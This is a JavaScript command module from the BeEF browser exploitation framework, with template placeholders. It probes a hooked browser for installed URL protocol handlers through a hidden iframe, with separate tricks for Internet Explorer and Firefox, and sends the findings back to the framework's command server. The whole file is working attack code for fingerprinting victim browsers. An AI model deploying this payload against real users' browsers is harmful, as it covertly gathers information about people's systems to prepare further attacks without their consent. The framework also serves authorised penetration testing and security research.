//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	// Initialize
	var handler_results = new Array;
	var handler_protocol = "<%= @handler_protocol %>".split(/\s*,\s*/);
	var handler_addr = "<%= @handler_addr %>";
	var iframe = beef.dom.createInvisibleIframe();

	// Internet Explorer
	if (beef.browser.isIE()) {

		var protocol_link = document.createElement('a');
		protocol_link.setAttribute('id', "protocol_link");
		protocol_link.setAttribute('href', "");
		iframe.contentWindow.document.appendChild(protocol_link);

		for (var i=0; i<handler_protocol.length; i++) {
			var result = "";
			var protocol = handler_protocol[i];
			try {
				var anchor = iframe.contentWindow.document.getElementById("protocol_link");
				anchor.href = protocol+"://"+handler_addr;
				if (anchor.protocolLong == "Unknown Protocol")
				     result = protocol + " unknown";
				else result = protocol + " exists";
			} catch(e) {
				result = protocol + " does not exist";
			}
			handler_results.push(result);
		}
		iframe.contentWindow.document.removeChild(protocol_link);
	}

	// Firefox
	if (beef.browser.isFF()) {

		var protocol_iframe = document.createElement('iframe');
		protocol_iframe.setAttribute('id', "protocol_iframe_<%= @command_id %>");
		protocol_iframe.setAttribute('src', "");
		protocol_iframe.setAttribute('style', "display:none;height:1px;width:1px;border:none");
		document.body.appendChild(protocol_iframe);

		for (var i=0; i<handler_protocol.length; i++) {
			var result = "";
			var protocol = handler_protocol[i];
			try {
				document.getElementById('protocol_iframe_<%= @command_id %>').contentWindow.location = protocol+"://"+handler_addr;
			} catch(e) {
				if (e.name == "NS_ERROR_UNKNOWN_PROTOCOL")
				     result = protocol + " does not exist";
				else result = protocol + " unknown";
			}
			if (!result) result = protocol + " exists";
			handler_results.push(result);
		}
		setTimeout("document.body.removeChild(document.getElementById('protocol_iframe_<%= @command_id %>'));",3000);
	}

	// Return results
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'handlers='+JSON.stringify(handler_results));

});

